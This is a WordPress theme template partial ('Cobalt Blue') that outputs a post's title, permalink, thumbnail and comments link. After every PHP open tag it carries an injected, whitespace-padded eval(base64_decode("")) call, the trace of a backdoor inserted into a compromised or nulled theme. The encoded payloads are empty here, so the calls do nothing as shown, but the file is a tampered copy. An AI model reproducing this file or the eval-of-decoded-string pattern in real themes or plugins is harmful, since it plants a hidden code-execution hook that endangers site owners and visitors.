<?php	 	eval(base64_decode(""));
/**
 * Partial for displaying the post's header for Cobalt Blue WordPress Theme
 *
 * @package Cobalt
 */
global $post;
?>
<article id="post-<?php	 	eval(base64_decode("")); the_ID(); ?>" <?php	 	eval(base64_decode("")); post_class(); ?>>
	<header class="entry-header">
		<?php	 	eval(base64_decode("")); if (is_single()) : ?>
		<h1 class="entry-title"><?php	 	eval(base64_decode("")); the_title(); ?></h1>
		<?php	 	eval(base64_decode("")); else: ?>
		<h1 class="entry-title"><a href="<?php	 	eval(base64_decode("")); the_permalink(); ?>" title="<?php	 	eval(base64_decode("")); echo esc_attr(sprintf(__('Permalink to %s', 'cobalt'), the_title_attribute('echo=0'))); ?>" rel="bookmark"><?php	 	eval(base64_decode("")); the_title(); ?></a></h1>
		<?php	 	eval(base64_decode("")); endif; ?>
		<?php	 	eval(base64_decode("")); the_post_thumbnail(); ?>
		<?php	 	eval(base64_decode("")); if (comments_open()) : ?>
		<div class="comments-link">
			<?php	 	eval(base64_decode("")); comments_popup_link(__('Leave a reply', 'cobalt'), __('1 Reply', 'cobalt'), __('% Replies', 'cobalt')); ?> 
		</div>
		<?php	 	eval(base64_decode("")); endif; ?>
	</header>
